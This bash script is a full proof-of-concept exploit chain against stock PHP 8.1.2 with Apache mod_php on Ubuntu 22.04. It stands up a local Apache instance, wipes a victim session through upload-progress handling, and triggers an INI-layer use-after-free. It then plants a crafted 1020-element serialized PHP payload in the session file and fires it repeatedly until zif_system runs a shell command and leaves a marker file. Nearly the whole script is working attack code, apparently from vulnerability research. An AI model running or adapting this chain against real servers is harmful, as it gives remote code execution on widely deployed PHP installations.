#!/bin/bash
# =============================================================================
# fa_jammy.sh — MISSION 3: the jammy fleet composition weapon with the FULL
# RCE final stage. Chains the four jammy bugs; stage 4 now EXECUTES instead
# of crashing: the session-file injection carries the complete zero4 weapon
# trigger, and the reader (declaring the Stage1/FIRE gadget classes, 8.1.2
# offsets) fires the in-band chain during session_start's decode:
#   1. session-wipe   — rfc1867 invalid-key write truncates the victim session
#   2. INI-UAF        — pre-RINIT OOM arm => stale PS(session_status)
#   3. session-gap injection — the FULL a:1020 Stage1 trigger planted through
#                       the upload_progress key hook write (wiped gap)
#   4. zero4 FULL     — the reader's session_start decodes the poison =>
#                       M1 dance leak -> M2 oracle -> M3 forge -> zif_system
#                       => system("sh /tmp/fa_jammy_cmd") => uid marker
# Target: Ubuntu 22.04 jammy system PHP 8.1.2 + Apache 2.4.52 mod_php,
# STOCK ZendMM, ASLR on, no gdb.
# =============================================================================
ART=/mnt/c/Users/andre/Downloads/php2shell-claude
OUT=$ART/receipts_8512/fa_mission3
ROOT=/tmp/fa_jammy
PORT=18380
URL=http://127.0.0.1:$PORT
MOD=$(ls /usr/lib/apache2/modules/libphp*.so 2>/dev/null | head -1)
[ -n "$MOD" ] || { echo "no mod_php"; exit 1; }
SID=fajammy000000000000000000000ab
MARKER=/tmp/fa_jammy_rce
# the FULL weapon trigger, shape8 kill shape: object at key i:0, fillers
# i:1..i:1018, then DUPLICATE key i:0 overwrite => mid-walk release (the
# exact pwn_zero4 dup-key entry, Stage1 gadget)
TRIGGER="k|a:1020:{i:0;O:6:\"Stage1\":0:{}"$(python3 -c "
s=''.join('i:%d;i:1;'%i for i in range(1,1019))
print(s,end='')")"i:0;i:5;}"

rm -rf "$ROOT"; mkdir -p "$ROOT/html/w" "$ROOT/html/d" "$ROOT/sess"
cp "$ART/fa_cli_core.php" "$ART/fa_jammy_reader.php" "$ROOT/html/"
echo '<?php echo "ARM_OK " . PHP_VERSION;' > "$ROOT/html/arm_target.php"
cp "$ROOT/html/arm_target.php" "$ROOT/html/w/"
echo '<?php echo "victim session write sid=" . session_id() . "\n"; $_SESSION["keep"]="keepme"; $_SESSION["uid"]=4242;' > "$ROOT/html/victim.php"

stop_apache() { for P in $(pgrep -f "apache2 -X -f $ROOT/httpd.conf" 2>/dev/null); do kill -9 "$P" 2>/dev/null; done; sleep 0.3; }
start_apache() {
  stop_apache
  cat > "$ROOT/httpd.conf" <<EOF
ServerName localhost
Listen 127.0.0.1:$PORT
PidFile $ROOT/httpd.pid
ErrorLog $ROOT/error.log
LogLevel warn
TypesConfig /etc/mime.types
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
LoadModule dir_module /usr/lib/apache2/modules/mod_dir.so
LoadModule mime_module /usr/lib/apache2/modules/mod_mime.so
LoadModule php_module $MOD
DocumentRoot $ROOT/html
<Directory $ROOT/html>
  Require all granted
  DirectoryIndex index.php
  php_admin_value session.save_path $ROOT/sess
  php_admin_value session.upload_progress.min_freq 0
  php_admin_value session.upload_progress.freq 1
  php_admin_value session.upload_progress.prefix upload_progress_
  php_admin_flag display_errors on
  php_admin_value memory_limit 8M
  php_admin_value post_max_size 64M
  php_admin_value upload_max_filesize 60M
  php_admin_value max_file_uploads 50
</Directory>
<Directory $ROOT/html/w>
  php_admin_value session.serialize_handler php_serialize
  php_admin_flag session.upload_progress.cleanup 0
</Directory>
<FilesMatch \\.php\$>
  SetHandler application/x-httpd-php
</FilesMatch>
MaxRequestWorkers 4
EOF
  : > "$ROOT/error.log"
  /usr/sbin/apache2 -X -f "$ROOT/httpd.conf" > "$ROOT/x.log" 2>&1 &
  disown
  for i in $(seq 1 40); do curl -s -o /dev/null --max-time 2 "$URL/arm_target.php" && break; sleep 0.4; done
}
elogs() { grep -E "$1" "$ROOT/error.log" | tail -${2:-4}; }

mkdir -p "$OUT"
{
echo "############################################################"
echo "# FA MISSION 3: jammy composition — final stage = RCE — $(date -u +%FT%TZ)"
echo "# target: jammy Ubuntu 22.04 system PHP 8.1.2 Apache mod_php"
echo "# stock ZendMM, ASLR on, no gdb, offsets 8102 receipted extract"
echo "############################################################"

echo; echo "===== STAGE 1: session-wipe (rfc1867 invalid-key truncation) ====="
start_apache
curl -s -H "Cookie: PHPSESSID=$SID" "$URL/victim.php"; echo
SESSFILE="$ROOT/sess/sess_$SID"
echo "victim session before: $(stat -c%s "$SESSFILE" 2>/dev/null || echo missing) bytes"
python3 "$ART/lc_arm.py" plain "$PORT" "$SID" 'wipe|me' /arm_target.php 2>&1 | head -3
sleep 0.5
SZ=$(stat -c%s "$SESSFILE" 2>/dev/null || echo missing)
echo "victim session after: $SZ bytes"
[ "$SZ" = "0" ] && echo "[PASS] STAGE 1: victim session wiped" || echo "[FAIL] STAGE 1"
elogs "invalid key"

echo; echo "===== STAGE 2: INI-UAF (stale status => save_path reads freed memory) ====="
: > "$ROOT/error.log"
python3 "$ART/lc_arm.py" nameflood "$PORT" 262144 24 /arm_target.php 2>&1 | head -4
sleep 0.5
curl -s --max-time 5 "$URL/arm_target.php"; echo " <- child alive"
elogs "open\(|Failed to read session data|cannot be changed|Allowed memory" 8
echo "[RECEIPT] STAGE 2: INI-layer UAF consumer warnings above"

echo; echo "===== STAGE 3: session-gap injection — FULL weapon trigger planted ====="
: > "$SESSFILE"
python3 "$ART/lc_arm.py" plain "$PORT" "$SID" "$TRIGGER" /w/arm_target.php 2>&1 | head -3
sleep 0.5
echo "session file after hook write: $(stat -c%s "$SESSFILE" 2>/dev/null || echo missing) bytes"
head -c 120 "$SESSFILE" 2>/dev/null; echo " ..."
grep -q "upload_progress_k|a:1020" "$SESSFILE" 2>/dev/null \
  && echo "[PASS] STAGE 3: FULL trigger planted through the wiped gap" \
  || echo "[FAIL] STAGE 3"

echo; echo "===== STAGE 4: zero4 FULL FIRE (reader session decode -> zif_system) ====="
SHOTS=${1:-5}
for s in $(seq 1 "$SHOTS"); do
  rm -f "$MARKER" /tmp/fa_jammy_diag.log
  # re-plant the poison (the reader's session_write_close rewrites the file)
  : > "$SESSFILE" 2>/dev/null
  python3 "$ART/lc_arm.py" plain "$PORT" "$SID" "$TRIGGER" /w/arm_target.php >/dev/null 2>&1
  sleep 0.3
  echo "--- shot $s: reader GET ---"
  curl -s --max-time 10 -H "Cookie: PHPSESSID=$SID" "$URL/fa_jammy_reader.php" | head -8
  if [ -f "$MARKER" ]; then
    echo "[PASS STAGE 4] shot $s MARKER: $(cat "$MARKER")"
    break
  else
    echo "[..] shot $s no marker; diag:"
    head -6 /tmp/fa_jammy_diag.log 2>/dev/null
  fi
  curl -s -o /dev/null --max-time 5 "$URL/arm_target.php" || start_apache
done
echo "---- final marker ----"
cat "$MARKER" 2>/dev/null || echo "(no marker)"
echo "---- child state / kill lines ----"
elogs "Segmentation|segfault|signal|stack smashing" 6
curl -s --max-time 5 "$URL/arm_target.php" && echo " <- child alive" || echo "child dead"
stop_apache
echo "############################################################"
} | tee "$OUT/fa_jammy.log"
echo "receipt: $OUT/fa_jammy.log"
